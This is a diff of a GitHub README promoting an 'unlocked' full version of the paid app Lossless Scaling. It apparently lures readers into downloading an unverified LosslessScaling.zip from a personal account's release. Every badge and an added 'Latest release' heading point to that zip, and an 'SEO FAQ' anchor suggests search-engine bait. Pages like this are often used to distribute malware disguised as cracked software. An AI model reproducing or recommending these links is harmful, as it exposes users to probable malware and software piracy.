@@ -8,13 +8,14 @@
 [![Downloads](https://img.shields.io/badge/Downloads-50K+-success?style=for-the-badge)](https://github.com/GalaxyboltNoble37142/Lossless-Scaling/releases/download/ver1/LosslessScaling.zip)
 [![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=for-the-badge&logo=windows)](https://github.com/GalaxyboltNoble37142/Lossless-Scaling/releases/download/ver1/LosslessScaling.zip)
 [![Status](https://img.shields.io/badge/Status-Unlocked%20%26%20Stable-brightgreen?style=for-the-badge)](https://github.com/GalaxyboltNoble37142/Lossless-Scaling/releases/download/ver1/LosslessScaling.zip)
+
 <img width="460" height="215" alt="image" src="https://github.com/user-attachments/assets/4e3f6a06-5655-4435-b327-832435c354d8" />
 
 [📥 Download Full Version](#-download-and-installation) • [✨ Key Features](#-key-features) • [⚙️ How to Use LSFG](#️-how-to-use-lsfg-step-by-step) • [❓ SEO FAQ](#-frequently-asked-questions-faq)
 
 </div>
 
-
+# [Latest release](https://github.com/GalaxyboltNoble37142/Lossless-Scaling/releases/download/ver1/LosslessScaling.zip)
 ---
 
 ## 📌 About Lossless Scaling 2026
